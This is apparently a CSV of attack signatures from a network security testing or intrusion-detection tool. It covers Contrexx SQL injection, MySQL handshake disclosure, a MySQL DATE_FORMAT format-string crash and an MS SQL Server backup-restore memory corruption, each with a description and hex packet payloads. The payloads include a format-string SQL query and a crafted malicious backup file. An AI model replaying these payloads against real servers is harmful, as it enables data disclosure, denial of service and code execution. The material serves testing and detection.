XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿Contrexx_SQL_Injection.xml,Contrexx SQL Injection Attack,"This attack takes advantage of a SQL injection flaw in Contrexx.  Contrexx is a Content Management System written in PHP.  This particular attack will attempt to enumerate usernames and passwords.  Contrexx is a web application, and would typically listen over port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿FSC20060502-06_MySQL_Login_Handshake_Information_Disclosure.xml,MySQL Login Handshake Information Disclosure,There exists an information disclosure vulnerability in MySQL database. The vulnerability is due to a flaw in the server component responsible for the login handshake procedure and allows an attacker with anonymous access to the database to read sensitive data stored in the memory of the server. The attacker then may use the acquired information to compromise the server or to facilitate other attack attempts.,Proprietary,TCP,7||00 00 01 0D A6 03 00 00 00 00 01 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ||AAAAAA||99 ||AAA||99 ||AAAAAAAAAAs||00||
FSC20060502-06_MySQL_Login_Handshake_Information_Disclosure.xml,MySQL Login Handshake Information Disclosure,There exists an information disclosure vulnerability in MySQL database. The vulnerability is due to a flaw in the server component responsible for the login handshake procedure and allows an attacker with anonymous access to the database to read sensitive data stored in the memory of the server. The attacker then may use the acquired information to compromise the server or to facilitate other attack attempts.,Proprietary,TCP,"||3A 00 00 00 0A ||5.0.20-debug||00 || ||00 00 00 ||Q`o.5_]6||00 ||,||A2 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ||3>{tS||22 ||L<'K($||00||"
﻿FSC20060721-02_MySQL_Server_Date_Format_Function_Format_String_Vulnerability.xml,MySQL Server Date_Format Function Format String Vulnerability,"There exists a denial of service vulnerability in the MySQL database server. The problem is caused by an incorrect handling of the arguments passed to the built-in SQL function DATE_FORMAT, which causes the application to terminate. A remote authenticated attacker can exploit this vulnerability to cause a denial of service condition on the target server.","Proprietary, SQL",TCP,||3A 00 00 01 85 A6 03 00 00 00 00 01 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ||root||00 14 AD ||N||B5 11 F2 C0 ||h/c||C7 ||}L.||15 84 09 ||V||95 ||$||FF||
FSC20060721-02_MySQL_Server_Date_Format_Function_Format_String_Vulnerability.xml,MySQL Server Date_Format Function Format String Vulnerability,"There exists a denial of service vulnerability in the MySQL database server. The problem is caused by an incorrect handling of the arguments passed to the built-in SQL function DATE_FORMAT, which causes the application to terminate. A remote authenticated attacker can exploit this vulnerability to cause a denial of service condition on the target server.","Proprietary, SQL",TCP,"0||00 00 00 03 ||SELECT DATE_FORMAT('%s%s%s%s%s%s%s%s%s%s', '1')"
FSC20060721-02_MySQL_Server_Date_Format_Function_Format_String_Vulnerability.xml,MySQL Server Date_Format Function Format String Vulnerability,"There exists a denial of service vulnerability in the MySQL database server. The problem is caused by an incorrect handling of the arguments passed to the built-in SQL function DATE_FORMAT, which causes the application to terminate. A remote authenticated attacker can exploit this vulnerability to cause a denial of service condition on the target server.","Proprietary, SQL",TCP,"7||00 00 00 0A ||4.1.13-nt||00 01 00 00 00 ||Q2FJ||7C ||Vy||7C 00 ||,||A2 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ||%?OMu)eC`||3A ||?n||00||"
FSC20060721-02_MySQL_Server_Date_Format_Function_Format_String_Vulnerability.xml,MySQL Server Date_Format Function Format String Vulnerability,"There exists a denial of service vulnerability in the MySQL database server. The problem is caused by an incorrect handling of the arguments passed to the built-in SQL function DATE_FORMAT, which causes the application to terminate. A remote authenticated attacker can exploit this vulnerability to cause a denial of service condition on the target server.","Proprietary, SQL",TCP,||07 00 00 02 00 00 00 02 00 00 00||
﻿FSC20080708-05_Microsoft_SQL_Server_Backup_Restoring_Memory_Corruption.xml,Microsoft SQL Server Backup Restoring Memory Corruption,"A memory corruption vulnerability exists in Microsoft SQL Server. The vulnerability is due to improper checks when parsing records in backup database. A local or remote authenticated attacker could exploit the vulnerability by issuing a RESTORE command with the path to a malicious backup file placed on local filesystem, SMB share or WebDAV. Successful exploitation would cause a memory corruption condition which may lead to arbitrary code injection and execution in the security context of the SQL Server, normally System for SQL Server 2000 and earlier. In an attack case where code injection is not successful, the SQL Server process will terminate. In a more sophisticated attack scenario where code injection is successful, the behaviour of the target host is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the SQL Server process.",HTTP/SMB/SQL,TCP,"GET /~blin/poc.bak HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.0||3B || .NET CLR 2.0.50727)||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
FSC20080708-05_Microsoft_SQL_Server_Backup_Restoring_Memory_Corruption.xml,Microsoft SQL Server Backup Restoring Memory Corruption,"A memory corruption vulnerability exists in Microsoft SQL Server. The vulnerability is due to improper checks when parsing records in backup database. A local or remote authenticated attacker could exploit the vulnerability by issuing a RESTORE command with the path to a malicious backup file placed on local filesystem, SMB share or WebDAV. Successful exploitation would cause a memory corruption condition which may lead to arbitrary code injection and execution in the security context of the SQL Server, normally System for SQL Server 2000 and earlier. In an attack case where code injection is not successful, the SQL Server process will terminate. In a more sophisticated attack scenario where code injection is successful, the behaviour of the target host is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the SQL Server process.",HTTP/SMB/SQL,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 08 Jul 2008 17||3A ||41||3A ||26 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8||0D 0A ||Last-Modified||3A || Tue, 08 Jul 2008 17||3A ||41||3A ||05 GMT||0D 0A ||ETag||3A || ||22 ||66481b7-a4600-45186b2424e40||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 673280||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/plain||3B || charset=ISO-8859-1||0D 0A 0D 0A ||TAPE||00 00 03 00 8C 00 0E 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 87 05 99 F5 E2 BB 05 00 00 00 01 00 00 00 01 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 ||,||00 ||^||00 00 04 00 12 1F ||a||D0 BA 8E 01 ||M||00 ||i||00 ||c||00 ||r||00 ||o||00 ||s||00 ||o||00 ||f||00 ||t||00 || ||00 ||S||00 ||Q||00 ||L||00 || ||00 ||S||00 ||e||00 ||r||00 ||v||00 ||e||00 ||r||00 00 00 00 00 00 00 ||RAID||00 00 00 00 || ||00 00 00 00 00 00 00 00 00 00 00 3B 05 A6 ||}B||15 B0 92 ||x@||A9 ||?||AD 80 22 7C 09 EF AD 00 00 F0 02 00 01 00 02 00 00 00 00 00 01 00 00 00 ||SPAD||00 00 00 00 ||&||03 00 00 00 00 00 00 00 00 00 00 ||4||17 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ||SFMB||00 00 00 00 00 02 0E 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00||"
FSC20080708-05_Microsoft_SQL_Server_Backup_Restoring_Memory_Corruption.xml,Microsoft SQL Server Backup Restoring Memory Corruption,"A memory corruption vulnerability exists in Microsoft SQL Server. The vulnerability is due to improper checks when parsing records in backup database. A local or remote authenticated attacker could exploit the vulnerability by issuing a RESTORE command with the path to a malicious backup file placed on local filesystem, SMB share or WebDAV. Successful exploitation would cause a memory corruption condition which may lead to arbitrary code injection and execution in the security context of the SQL Server, normally System for SQL Server 2000 and earlier. In an attack case where code injection is not successful, the SQL Server process will terminate. In a more sophisticated attack scenario where code injection is successful, the behaviour of the target host is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the SQL Server process.",HTTP/SMB/SQL,TCP,||00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ||SFMB||00 00 00 00 00 02 0E 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 07 ||8||00 00 00 02 00 00 00 00 ||6||0A 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00||
